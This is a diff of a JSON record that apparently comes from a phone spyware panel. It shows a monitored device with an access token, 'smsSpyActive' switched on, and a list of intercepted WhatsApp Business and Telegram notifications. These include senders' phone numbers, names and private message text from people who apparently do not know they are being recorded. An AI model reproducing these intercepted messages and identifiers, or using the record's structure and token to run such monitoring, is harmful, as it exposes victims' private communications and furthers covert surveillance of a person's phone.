@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775633218557,
+    "lastSeen": 1775633221596,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,62 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎128 pesan dari 4 chat",
+        "time": "08/04 14:27",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633222229
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 898-7564-441",
+        "content": "Lu online doang anjing",
+        "time": "08/04 14:27",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633222223
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎127 pesan dari 4 chat",
+        "time": "08/04 14:27",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633222211
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 856-2460-4911",
+        "content": "📡 Undangan admin saluran",
+        "time": "08/04 14:27",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633222081
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎126 pesan dari 4 chat",
+        "time": "08/04 14:26",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633219754
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 856-2460-4911",
+        "content": "Permisi Azx",
+        "time": "08/04 14:26",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633219715
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎125 pesan dari 4 chat",
+        "time": "08/04 14:26",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633219141
+      },
       {
         "appName": "WA Business",
         "sender": "+62 856-2460-4911",
@@ -4270,62 +4326,6 @@
         "time": "08/04 14:10",
         "pkg": "org.telegram.messenger.web",
         "receivedAt": 1775632250794
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "10 new messages from 10 chats",
-        "time": "08/04 14:10",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632250771
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ALL BUYYER GOJO HARIAN: 𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "Send id tele lu",
-        "time": "08/04 14:10",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632249787
-      },
-      {
-        "appName": "Telegram",
-        "sender": "マ || !`𝙈𝙖𝙣𝙯𝙧𝙤𝙬𝙧 𝐓𝟓",
-        "content": "enggaa",
-        "time": "08/04 14:10",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632249727
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "send dana lu",
-        "time": "08/04 14:10",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632249665
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "12 new messages from 11 chats",
-        "time": "08/04 14:10",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632249301
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ALL BUYYER GOJO HARIAN: 𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "Send id tele lu",
-        "time": "08/04 14:10",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632245580
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "KEL",
-        "time": "08/04 14:10",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632245527
       }
     ],
     "galleryPhotos": [],
